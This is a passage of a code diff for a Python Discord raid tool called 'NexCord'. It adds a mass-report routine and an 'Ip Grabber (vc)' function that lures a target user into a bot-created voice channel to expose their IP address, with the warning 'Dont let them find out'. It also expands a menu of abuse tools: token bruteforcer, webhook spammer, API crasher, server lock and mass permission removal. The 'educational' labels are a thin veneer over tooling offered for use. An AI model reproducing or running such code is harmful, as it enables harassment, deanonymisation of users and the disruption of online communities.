+                print(WHITE + "MASS REPORT COMPLETED" + RESET)
+                print(WHITE + "="*50 + RESET)
+                print(WHITE + f"Successfully reported: {reported_count}" + RESET)
+                print(RED + f"Failed reports: {failed_count}" + RESET)
+                print(WHITE + f"Excluded users: {excluded_count}" + RESET)
+                print(WHITE + f"Total members processed: {len(guild.members)}" + RESET)
+                print(WHITE + f"Report reason: {report_reason}" + RESET)
+                
+            except Exception as e:
+                print(RED + f"Error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nOperation cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def voice_call_ip_resolver():
+    global should_exit
+    should_exit = False
+    
+    try:
+        clear()
+        print(RED + BANNER + RESET)
+        print(WHITE + "[ Educational Voice Call IP Research - SECURITY ONLY ]\n" + RESET)
+        print(RED + "be careful... Dont let them find out\n" + RESET)  
+        
+        print(WHITE + "Voice Call IP Research Method:" + RESET)
+        print(WHITE + "• User must accept Voice Call" + RESET)
+        print(WHITE + "• WebRTC Peer-to-Peer Connection" + RESET)
+        print(WHITE + "• STUN/TURN Server IP Exposure" + RESET)
+        print(WHITE + "• Discord has Protection\n" + RESET)
+        
+        
+        
+        TOKEN = input(WHITE + "Enter bot token: " + RESET).strip()
+        if not TOKEN:
+            print(RED + "No token provided!" + RESET)
+            return_to_menu()
+            return
+            
+        TARGET_ID = int(input(WHITE + "Enter target user ID: " + RESET))
+        GUILD_ID = int(input(WHITE + "Enter server ID: " + RESET))
+
+        confirm = input(WHITE + "Type 'CONFIRM' to start: " + RESET).strip()
+        if confirm.upper() != "CONFIRM":
+            print(RED + "Operation cancelled." + RESET)
+            return_to_menu()
+            return
+
+        intents = discord.Intents.default()
+        intents.members = True
+        intents.voice_states = True
+        bot = commands.Bot(command_prefix="!", intents=intents)
+
+        @bot.event
+        async def on_ready():
+            global should_exit
+            try:
+                guild = bot.get_guild(GUILD_ID)
+                if not guild:
+                    print(RED + "Server not found!" + RESET)
+                    await bot.close()
+                    return
+
+                target = guild.get_member(TARGET_ID)
+                if not target:
+                    print(RED + "Target user not found!" + RESET)
+                    await bot.close()
+                    return
+
+                print(WHITE + f"Starting voice call research with {target.name}..." + RESET)
+
+                
+                voice_channel = await guild.create_voice_channel("Nexcord")
+                print(WHITE + f"Created voice channel: {voice_channel.name}" + RESET)
+
+                
+                try:
+                    vc = await voice_channel.connect()
+                    print(WHITE + "Bot joined voice channel" + RESET)
+                except Exception as e:
+                    print(RED + f"Failed to join voice: {e}" + RESET)
+                    await voice_channel.delete()
+                    await bot.close()
+                    return
+
+                
+                print(WHITE + f"Waiting for {target.name} to join voice channel..." + RESET)
+                print(WHITE + "Voice call must be accepted for WebRTC research\n" + RESET)
+
+                start_time = time.time()
+                while not should_exit and (time.time() - start_time) < 60:  
+                    
+                    if voice_channel.members and target in voice_channel.members:
+                        print(WHITE + f"✅ {target.name} joined voice channel!" + RESET)
+                        print(WHITE + "WebRTC connection established for research" + RESET)
+                        print(WHITE + "STUN/TURN servers exchange connection data" + RESET)
+                        break
+                    await asyncio.sleep(1)
+
+                if not should_exit:
+                    print(LILA + "\nVoice Call Research Results:" + RESET)
+                    print(LILA + "• WebRTC Peer-to-Peer: Active" + RESET)
+                    print(LILA + "• STUN Server: Contacted" + RESET)
+                    print(LILA + "• TURN Server: Fallback available" + RESET)
+                    print(LILA + "• IP Protection: Discord secured" + RESET)
+
+                
+                await vc.disconnect()
+                await voice_channel.delete()
+                print(WHITE + "\nResearch completed - Voice channel deleted" + RESET)
+                
+            except Exception as e:
+                print(RED + f"Research error: {e}" + RESET)
+            finally:
+                await bot.close()
+
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(bot.start(TOKEN))
+        
+    except KeyboardInterrupt:
+        print(RED + "\nResearch cancelled by user!" + RESET)
+    except Exception as e:
+        print(RED + f"Error: {e}" + RESET)
+    
+    return_to_menu()
+
+def nexcord_plus_tool():
+    try:
+        
+        import webbrowser
+        webbrowser.open("https://discord.gg/nexcord")
+        
+        
+        return
+        
+    except Exception as e:
+        
+        return
 
 def main_menu():
     tools = {
@@ -1142,39 +3229,78 @@ def main_menu():
         "17": ("Timeout (user)", timeout_user_tool),
         "18": ("Timeout (all)", timeout_all_tool),
         "19": ("Message Logger", message_logger_tool),
-        "20": ("Server Logger (LOGS EVERYTHING!)", server_logger_tool),
-        "21": ("Server lock (RANSOMEWARE)", server_lock_tool),
+        "20": ("Server Logger", server_logger_tool),
+        "21": ("Server lock ", server_lock_tool),
+        "22": ("Mass Channel Creator", mass_channel_creator),
+        "23": ("Mass Role Creator", mass_role_creator),
+        "24": ("Webhook Fucker", webhook_spammer),
+        "25": ("Mass Voice Creator", voice_channel_terror),
+        "26": ("Staff confusion (slow)", role_chaos_maker),
+        "27": ("Move all", move_all_voice_tool),
+        "28": ("Token bruteforcer", token_bruteforcer_tool),
+        "29": ("Bot network nuker", bot_network_nuker_tool),
+        "30": ("Discord api crasher", discord_api_crasher_tool),
+        "31": ("Nickname chaos", nickname_chaos_tool),
+        "32": ("Account Lookup (server)", account_lookup_tool),
+        "33": ("Remove perms (all)", remove_perms_all_tool),
+        "34": ("Report all", report_all_tool),
+        "35": ("Ip Grabber (vc)", voice_call_ip_resolver),
+        "36": ("NexCord+", nexcord_plus_tool),
     }
 
     while True:
         clear()
-        print(PINK + BANNER + RESET)
+        print(RED + BANNER + RESET)
 
-        # Spalten vorbereiten
-        left_col = [f"{k}) {tools[k][0]}" for k in ["1","2","3","4","5","6","7","8","9","10"] if k in tools]
-        right_col = [f"{k}) {tools[k][0]}" for k in ["11","12","13","14","15","16","17","18","19","20"] if k in tools]
-        last_col = [f"{k}) {tools[k][0]}" for k in ["21"] if k in tools]
+        left_col = [f"{k}) {tools[k][0]}" for k in ["1","2","3","4","5","6","7","8","9","10","11","12"] if k in tools]
         
+        mid_col = [f"{k}) {tools[k][0]}" for k in ["13","14","15","16","17","18","19","20","21","22","23","24"] if k in tools]
+        
+        right_col = []
+        for k in ["25","26","27","28","29","30","31","32","33","34","35","36"]:
+            if k in tools:
+                if k in ["34", "35"]:  
+                    right_col.append(LILA + f"{k}) {tools[k][0]}" + RESET)
+                elif k == "36":  
+                    right_col.append(GOLD + f"{k}) {tools[k][0]}" + RESET)
+                else:
+                    right_col.append(WHITE + f"{k}) {tools[k][0]}" + RESET)
+        
+        right_col.extend([""] * (12 - len(right_col)))
 
-        max_len = max(len(left_col), len(right_col), len(last_col))
+        max_len = max(len(left_col), len(mid_col), len(right_col))
 
-        # Spalten ausgeben
         for i in range(max_len):
             l = left_col[i] if i < len(left_col) else ""
+            m = mid_col[i] if i < len(mid_col) else "" 
             r = right_col[i] if i < len(right_col) else ""
-            la = last_col[i] if i < len(last_col) else ""
-            print(WHITE + f"{l:<35}{r:<35}{la}" + RESET)
+            print(f"{l:<35}{m:<35}{r}")
 
-        choice = input(WHITE + "\nType: " + RESET).strip().upper()
+        print(RED + "Press Ctrl+C to cancel any operation and return to main menu" + RESET)
+        print(GOLD + "Get NexCord+ - Fully customize EVERY tool with unlimited features!" + RESET)
+        
+        try:
+            choice = input(WHITE + "\nType: " + RESET).strip().upper()
+        except KeyboardInterrupt:
+            print("")
+            continue
+        
         if choice == "Q":
             print(WHITE + "Exiting NexCord..." + RESET)
             break
         elif choice in tools:
-            tools[choice][1]()
+            try:
+                tools[choice][1]()
+            except KeyboardInterrupt:
+                print(RED + "Operation cancelled!" + RESET)
+                return_to_menu()
         else:
-            input(WHITE + "\nInvalid input! Press [Enter] to try again..." + RESET)
-
+            try:
+                input(RED + "Invalid command! Press [Enter] to try again..." + RESET)
+            except KeyboardInterrupt:
+                print("")
+                continue
 
 if __name__ == "__main__":
-    set_title("NexCord - Made by Nexoo")
+    set_title("NexCord Basic - Made by Nexoo")
     main_menu()
